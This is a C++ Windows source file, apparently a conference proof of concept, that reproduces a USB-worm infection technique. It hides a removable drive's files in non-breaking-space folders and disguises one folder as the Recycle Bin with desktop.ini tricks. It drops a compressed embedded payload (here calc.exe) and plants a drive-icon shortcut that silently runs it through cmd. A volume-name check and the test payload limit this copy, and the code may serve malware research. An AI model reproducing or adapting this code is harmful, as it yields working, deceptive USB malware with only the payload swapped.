#include <Windows.h>
#include <stdio.h>
#include "shobjidl.h"
#include "shlguid.h"
#include "..\NTHeader\ntos.h"
#include "Includes.h"
#define _CRT_SECURE_NO_WARNINGS

UCHAR* decompress_buffer(const char* buffer, const int bufferLen, int uncompBufferLen, ULONG* uncompBufferSize)
{
    _RtlDecompressBuffer RtlDecompressBuffer = (_RtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
    NTSTATUS result;
    UCHAR* uncompBuffer = (UCHAR*)malloc(uncompBufferLen);

    while ((result = RtlDecompressBuffer(
        COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM,								// CompressionFormat
        uncompBuffer,                                          // UncompressedBuffer
        uncompBufferLen,                                       // UncompressedBufferSize
        (UCHAR*)buffer,                                       // CompressedBuffer
        bufferLen,                                             // CompressedBufferSize
        uncompBufferSize                                       // FinalUncompressedSize
    )) == STATUS_BAD_COMPRESSION_BUFFER)
    {
        uncompBufferLen *= 2;
        printf("[+] reallocating %I64u\n", uncompBufferLen);
        uncompBuffer = (UCHAR*)realloc(uncompBuffer, uncompBufferLen);
    }

    if (result != STATUS_SUCCESS) {
        Status_Error_Code(result);
        return 0;
    }
    
    return uncompBuffer;
}

BOOL InstallPayload(WCHAR* FileName)
{
    HRSRC  hDllResource = NULL;
    ULONG realDecompSize;
    DWORD bytesWritten=0;
    hDllResource = FindResource(NULL, L"_BITMAP_", L"BINARY");
    UCHAR *FileInfo[MAX_PATH] = {};
    UNICODE_STRING uHiddenFile = { 0 };
    OBJECT_ATTRIBUTES obja = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    NTSTATUS status = 0;
    HANDLE hTargetFile = INVALID_HANDLE_VALUE;
    HANDLE hTargetFile2 = INVALID_HANDLE_VALUE;
    HANDLE hTargetFile3 = INVALID_HANDLE_VALUE;
    LARGE_INTEGER Offset = { 0 };

    if (hDllResource == NULL)
    {
        printf("[-] Unable to find our resource %#lx\n", GetLastError());
        return FALSE;
    }
    printf("[+} Found our embedded payload\n");
    HGLOBAL hLoaded = LoadResource(NULL, hDllResource);
    LPVOID lpPayLoadBuffer = LockResource(hLoaded);
    DWORD dwSize = SizeofResource(NULL, hDllResource);
    UCHAR* decompressed_buffer = decompress_buffer((char*)lpPayLoadBuffer, dwSize, dwSize * 200, &realDecompSize);
    if (decompressed_buffer == 0)
    {
        printf("[!] Decompressed Buffer size of 0. Something went wrong no compressed data to write\n");
        return FALSE;
    }

    RtlInitUnicodeString(&uHiddenFile, FileName);
    obja.Attributes = OBJ_CASE_INSENSITIVE;
    obja.Length = sizeof(obja);
    obja.ObjectName = &uHiddenFile;
    //Must be ABSOLUTE path!!
    status = NtCreateFile(&hTargetFile, FILE_ALL_ACCESS, &obja, &io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Failed to create our hidden file NTStatus code of %#lx\n", status);
        return FALSE;
    }

    status = NtWriteFile(hTargetFile, NULL, NULL, NULL, &io, decompressed_buffer, realDecompSize, &Offset, NULL);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Failed to write to our payload file %#lx\n", status);
        return FALSE;
    }
    CloseHandle(hTargetFile);

    return TRUE;
}

WCHAR* SetupUSBFolders()
{
    WCHAR drive[] = { '?',':','\\',0 };
    WCHAR NBSPDIR1[MAX_PATH] = {};
    WCHAR NBSPDIR2[MAX_PATH] = {};
    WCHAR Dir2[MAX_PATH] = {};
    WCHAR Dir3[MAX_PATH] = {};
    WCHAR Dir4[MAX_PATH] = {};
    WCHAR Temp[MAX_PATH] = {};
    WCHAR szVolumeName[MAX_PATH] = {};
    WCHAR ShellIconPart1[] = L"[.ShellClassInfo]\r\nIconResource=";
    WCHAR ShellIconPart2[MAX_PATH] = {};
    WCHAR ShellIconFull[MAX_PATH] = {};
    WCHAR Rec_CLSID[] = L"[.ShellClassInfo]\r\nCLSID = {645FF040-5081-101B-9F08-00AA002F954E}";
    WCHAR FileName[MAX_PATH] = L"\\desktop.ini";
    DWORD bytesWritten;
    ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\SHELL32.dll,7", ShellIconPart2, MAX_PATH);
    wchar_t wHiddenDir[MAX_PATH] = {};
    UNICODE_STRING uDosDirPathName = { 0 };
    OBJECT_ATTRIBUTES obja = { 0 };
    NTSTATUS status = 0;
    HANDLE hFileDir = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK io = { 0 };
    WCHAR MovePath[MAX_PATH] = {};
    WCHAR File1[MAX_PATH] = {};
    WCHAR File2[MAX_PATH] = {};
    wsprintfW(ShellIconFull, L"%s%s", ShellIconPart1, ShellIconPart2);
    WIN32_FIND_DATAW fileData;
    HANDLE fileHandle;

    for (drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++)
    {
        UINT drivetype = GetDriveTypeW(drive);
        if (drivetype == DRIVE_REMOVABLE) //Removeable Drive attached
        {
            BOOL bSucceeded = GetVolumeInformationW(drive,
                szVolumeName,
                MAX_PATH,
                NULL,
                NULL,
                NULL,
                NULL,
                0);
            if (wcscmp(szVolumeName,L"RECON2023")==0) { //Safety check here as we only want to test if the USB volume name is RECON2023
                wsprintfW(NBSPDIR1, L"%s%c", drive, 160); //1st NBSP Directory
                wsprintfW(NBSPDIR2, L"%s\\%c", NBSPDIR1, 160); //2nd NBSP sub-Directory

                CreateDirectory(NBSPDIR1, NULL);//Create 1st directory on USB parent folder with NBSP character
                CreateDirectory(NBSPDIR2, NULL);//Create 2nd sub-directory on USB parent folder with NBSP character
                wsprintfW(MovePath, L"%s\\*.*", drive);
                fileHandle = FindFirstFile(MovePath, &fileData); //Move all files in USB device to NBSP folder
                if (fileHandle != INVALID_HANDLE_VALUE)
                {
                    do
                    {
                        WCHAR* FileEnd = wcsrchr(fileData.cFileName, L'.');
                        if (lstrcmp(FileEnd, L".lnk") != 0)
                        {
                            if (lstrcmp(fileData.cFileName, L"System Volume Information") != 0 && fileData.cFileName[0] != 160) //File name not equal to NBSP
                            {
                                wsprintfW(File1, L"%s%s", drive, fileData.cFileName);
                                wsprintfW(File2, L"%s\\%s", NBSPDIR2,fileData.cFileName); //Move all files from root of USB device to 2nd NBSP sub-directory
                                if (!MoveFile(File1, File2))
                                {
                                    printf("[!] Unable to move file to target folder error code %08x\n", GetLastError());
                                    return FALSE;
                                }
                            }
                        }
                    } while (FindNextFile(fileHandle, &fileData) != 0);
                }
                SetFileAttributes(NBSPDIR1, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY |FILE_ATTRIBUTE_HIDDEN  | FILE_ATTRIBUTE_DIRECTORY); //Set first NBSP Attributes 
                SetFileAttributes(NBSPDIR2, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY); //Set second NBSP Attributes
                wsprintfW(Temp, L"%s%s", NBSPDIR1, FileName); //Desktop.ini
                HANDLE fhandle=CreateFile(Temp, GENERIC_ALL, NULL, NULL, OPEN_ALWAYS, NULL, NULL); //create desktop.ini in NBSP folder
                size_t required_size = WideCharToMultiByte(CP_UTF8, 0, ShellIconFull, -1, NULL, 0, NULL, NULL);
                char* buffer = (char*)calloc(required_size, sizeof(char));
                WideCharToMultiByte(CP_UTF8, 0, ShellIconFull, -1, buffer, required_size, NULL, NULL);
                WriteFile(fhandle, buffer, strlen(buffer), &bytesWritten, NULL); //Write to desktop.ini LNK file with drive image 
                CloseHandle(fhandle);
                SetFileAttributes(Temp, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY); //Set attributes for desktop.ini in 1st NBSP directory
                wsprintfW(File1, L"%s", Temp); //Reuse File1 to store 1st Desktop.ini
                wsprintfW(Temp, L"%s%s", NBSPDIR2, FileName); //Desktop.ini
                CopyFile(File1, Temp,FALSE); //Same file, so we just copy it to the 2nd NBSP directory
                wsprintfW(Dir3, L"%s\\RECYCLER.BIN", NBSPDIR2);
                CreateDirectory(Dir3, NULL); //Create Recycler.bin folder in 2nd NBSP directory
                wsprintfW(Dir4, L"%s%s", Dir3, L"\\files"); //Create files sub-folder in recycler.bin folder
                CreateDirectory(Dir4, NULL);
                wsprintfW(Temp, L"%s%s%s",L"\\??\\", Dir4, L"\\calc.exe"); //Our test file calc.exe

                WCHAR ImplantPath[MAX_PATH];
                BOOL Result = InstallPayload(Temp); //Decompress calc.exe to 2ndNBSP\files sub-folder
                if (!Result)
                {
                    printf("[!] Decompressed Buffer size of 0. Something went wrong no compressed data to write\n");
                    return FALSE;
                }
                SetFileAttributes(Dir3, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY); //set file to hidden
                               
                wsprintfW(Temp, L"%s%s", Dir3, FileName); //Next desktop.ini contains COM for Recycle object
                HANDLE fhandle3 = CreateFile(Temp, GENERIC_ALL, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
                size_t required_size2 = WideCharToMultiByte(CP_UTF8, 0, Rec_CLSID, -1, NULL, 0, NULL, NULL);
                char* buffer2 = (char*)calloc(required_size2, sizeof(char));
                WideCharToMultiByte(CP_UTF8, 0, Rec_CLSID, -1, buffer2, required_size, NULL, NULL);
                WriteFile(fhandle3, buffer2, strlen(buffer2), &bytesWritten, NULL);
                CloseHandle(fhandle3);
                SetFileAttributes(Temp, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

                return Dir3;
            }

        }

    }

    return FALSE;
}


bool CreateShortCuts(WCHAR* drive)
{
    HRESULT hres;
    IShellLink* psl;
    WCHAR DisPath[MAX_PATH];
    WCHAR ExePath[MAX_PATH];
    WCHAR Temp[MAX_PATH];
    LPCWCHAR Path = L"%ComSpec%";
    HRESULT hrCoInit = CoInitialize(NULL);
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    wsprintfW(DisPath, L"/q /c \"%s\\files\\calc.exe\"", drive);
    wsprintfW(ExePath, L"%s\\files\\calc.exe", drive);
    WCHAR volumeName[MAX_PATH + 1] = { 0 };
    WCHAR fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;
    if (SUCCEEDED(hres))
    {
        IPersistFile* ppf;

        // Set the path to the shortcut target and add the description. 
        psl->SetPath(Path);
        psl->SetWorkingDirectory(NULL);
        psl->SetArguments(DisPath);
        psl->SetShowCmd(SW_SHOWMINNOACTIVE);
        psl->SetIconLocation(L"%SystemRoot%\\system32\\SHELL32.dll", 7);

        // Query IShellLink for the IPersistFile interface, used for saving the 
        // shortcut in persistent storage. 
        hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

        if (SUCCEEDED(hres))
        {
            WCHAR wsz[MAX_PATH];
            wchar_t *DriveLetter;
            wcstok_s((wchar_t*)drive, L"\\", &DriveLetter); //We need just the drive letter of the USB device
            if (!GetVolumeInformation(drive, volumeName, sizeof(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, sizeof(fileSystemName)))
            {
                wsprintfW(wsz, L"%s:\\myfiles.lnk", drive);
                psl->SetDescription(L"MyFiles");
            }
            else
            {
                wsprintfW(wsz, L"%s\\%s.lnk", drive, volumeName);
                psl->SetDescription(volumeName); //not necessary
            }
            // Save the link by calling IPersistFile::Save. 
            hres = ppf->Save(wsz, TRUE);
            ppf->Release();
            wsprintfW(Temp, L"%s\\%c\\%s.lnk", drive, 160, volumeName);
            CopyFile(wsz, Temp, FALSE); //copy shortcut from root to 1st NBSP directory
        }
        psl->Release();

        STARTUPINFOW info = { sizeof(info) };
        PROCESS_INFORMATION  processInfo;
        wchar_t cmdLineArgs[MAX_PATH] = L"";
        wsprintfW(cmdLineArgs, L"%s\\%c",drive, 160);
        //__debugbreak();
        CreateProcess(ExePath, cmdLineArgs, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo);

    }

    return TRUE;
}
int main(int argv, char** argc)
{

    WCHAR* USBDrive = {};
    USBDrive = SetupUSBFolders();
    if (USBDrive)
    {
        WCHAR* buffer = (WCHAR*)calloc(wcslen(USBDrive), sizeof(WCHAR));
        wsprintfW(buffer, L"%s", USBDrive);
        BOOL rst = CreateShortCuts(buffer);
    }   
    else
    {
        printf("[-] Unable to find removable device\n");
    }
    printf("[+] Finished");
}